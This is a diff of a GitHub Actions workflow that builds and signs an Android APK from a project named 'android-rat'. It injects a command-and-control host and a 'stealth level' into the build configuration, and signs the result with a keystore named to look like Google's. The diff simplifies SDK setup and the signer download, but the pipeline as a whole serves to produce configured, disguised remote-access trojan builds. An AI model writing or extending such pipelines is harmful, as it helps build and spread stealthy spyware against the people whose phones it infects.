@@ -32,7 +32,6 @@ env:
   JAVA_VERSION: "17"
   ANDROID_COMPILE_SDK: "34"
   ANDROID_BUILD_TOOLS: "34.0.0"
-  CMDLINE_TOOLS_VERSION: "11076708"
 
 jobs:
   build:
@@ -54,34 +53,16 @@ jobs:
 
       # ── Android SDK ───────────────────────────────────────
       - name: Set up Android SDK
+        uses: android-actions/setup-android@v3
+
+      - name: Install build tools
         run: |
-          set -euo pipefail
-          SDK_ROOT="$HOME/android-sdk"
-          mkdir -p "$SDK_ROOT/cmdline-tools"
-          cd "$SDK_ROOT/cmdline-tools"
-
-          curl -fsSLo cmdline-tools.zip \
-            "https://dl.google.com/android/repository/commandlinetools-linux-${{ env.CMDLINE_TOOLS_VERSION }}_latest.zip"
-          unzip -q cmdline-tools.zip
-          rm cmdline-tools.zip
-          mv cmdline-tools latest
-
-          echo "ANDROID_SDK_ROOT=$SDK_ROOT" >> "$GITHUB_ENV"
-          echo "ANDROID_HOME=$SDK_ROOT"     >> "$GITHUB_ENV"
-          echo "$SDK_ROOT/platform-tools"              >> "$GITHUB_PATH"
-          echo "$SDK_ROOT/cmdline-tools/latest/bin"    >> "$GITHUB_PATH"
-          echo "$SDK_ROOT/build-tools/${{ env.ANDROID_BUILD_TOOLS }}" >> "$GITHUB_PATH"
-
-      - name: Install build tools + platform
-        run: |
-          set -eo pipefail
-          yes | sdkmanager --licenses > /dev/null || true
           sdkmanager --install \
             "build-tools;${{ env.ANDROID_BUILD_TOOLS }}" \
             "platforms;android-${{ env.ANDROID_COMPILE_SDK }}" \
-            "platform-tools"
+            --sdk_root=$ANDROID_SDK_ROOT
 
-      # ── Patch build config ────────────────────────────────
+      # ── Patch local.properties ────────────────────────────
       - name: Patch build config
         env:
           C2_HOST:  ${{ github.event.inputs.c2_host  || 'localhost' }}
@@ -90,7 +71,7 @@ jobs:
           STEALTH:  ${{ github.event.inputs.stealth_level || '2' }}
         run: |
           cd android-rat
-          sed -i '/^org\.gradle\.java\.home=/d' gradle.properties
+          # Write / overwrite local.properties
           cat > local.properties <<EOF
           sdk.dir=$ANDROID_SDK_ROOT
           c2.host=${C2_HOST}
@@ -116,41 +97,33 @@ jobs:
       # ── Gradle build ──────────────────────────────────────
       - name: Build APK
         working-directory: android-rat
-        env:
-          KEYSTORE_PATH:         ${{ github.workspace }}/android-rat/google-services-release.jks
-          KEYSTORE_PASSWORD:     ${{ secrets.KEYSTORE_PASSWORD }}
-          KEYSTORE_ALIAS:        ${{ secrets.KEYSTORE_ALIAS }}
-          KEYSTORE_KEY_PASSWORD: ${{ secrets.KEYSTORE_KEY_PASSWORD }}
         run: |
           chmod +x gradlew
           ./gradlew assembleRelease --no-daemon --stacktrace
 
-      # ── uber-apk-signer ───────────────────────────────────
-      - name: Obtain uber-apk-signer
+      # ── uber-apk-signer: use pre-built JAR if available, else build from source ──
+      - name: Download uber-apk-signer (if not in repo)
         run: |
-          mkdir -p uber-apk-signer-main/target
-          SIGNER_URL=$(curl -s https://api.github.com/repos/patrickfav/uber-apk-signer/releases/latest \
-            | grep 'browser_download_url.*\.jar"' | grep -v sources | head -1 \
-            | cut -d'"' -f4)
-          if [ -n "$SIGNER_URL" ]; then
-            curl -fsSL "$SIGNER_URL" -o uber-apk-signer-main/target/uber-apk-signer.jar
-            echo "Downloaded pre-built signer: $SIGNER_URL"
-          else
-            echo "No pre-built release found — will build from source"
+          if [ ! -d "uber-apk-signer-main" ]; then
+            echo "uber-apk-signer-main not found, downloading pre-built JAR..."
+            SIGNER_URL=$(curl -s https://api.github.com/repos/patrickfav/uber-apk-signer/releases/latest \
+              | grep 'browser_download_url.*\.jar"' | grep -v sources | head -1 \
+              | cut -d'"' -f4)
+            mkdir -p uber-apk-signer-main/target
+            curl -L "$SIGNER_URL" -o uber-apk-signer-main/target/uber-apk-signer.jar
+            echo "Downloaded: $SIGNER_URL"
+            touch .signer_downloaded
           fi
 
-      # FIX: hashFiles() in step-level 'if' always returns a string; a non-empty
-      # string is truthy, so the original condition inverted the intent. Use
-      # success() + explicit empty-string comparison instead.
+      # ── Build uber-apk-signer ─────────────────────────────
       - name: Cache Maven packages
-        if: ${{ hashFiles('uber-apk-signer-main/target/uber-apk-signer.jar') == '' }}
         uses: actions/cache@v4
         with:
           path: ~/.m2
           key: ${{ runner.os }}-m2-${{ hashFiles('uber-apk-signer-main/pom.xml') }}
 
       - name: Build uber-apk-signer from source
-        if: ${{ hashFiles('uber-apk-signer-main/target/uber-apk-signer.jar') == '' }}
+        if: ${{ hashFiles('.signer_downloaded') == '' }}
         working-directory: uber-apk-signer-main
         run: |
           chmod +x mvnw
@@ -165,11 +138,6 @@ jobs:
         run: |
           SIGNER_JAR=$(ls uber-apk-signer-main/target/uber-apk-signer*.jar | head -1)
           APK=$(ls android-rat/app/build/outputs/apk/release/*.apk | head -1)
-
-          # FIX: --out and --overwrite are mutually exclusive. Keep --out,
-          # drop --overwrite. Also mkdir -p so the folder definitely exists.
-          mkdir -p ./signed-output
-
           java -jar "$SIGNER_JAR" \
             --apks "$APK" \
             --ks android-rat/google-services-release.jks \
@@ -178,7 +146,6 @@ jobs:
             --ksPass "$KS_PASS" \
             --out ./signed-output \
             --allowResign
-
           echo "Signed APK:"
           ls -lh ./signed-output/
 
@@ -194,8 +161,6 @@ jobs:
           if-no-files-found: warn
 
       # ── Summary ───────────────────────────────────────────
-      # FIX: github.event.inputs.* is empty on push events. Use env vars set
-      # earlier so the table doesn't print blank rows.
       - name: Build summary
         env:
           C2_HOST:  ${{ github.event.inputs.c2_host  || 'localhost' }}
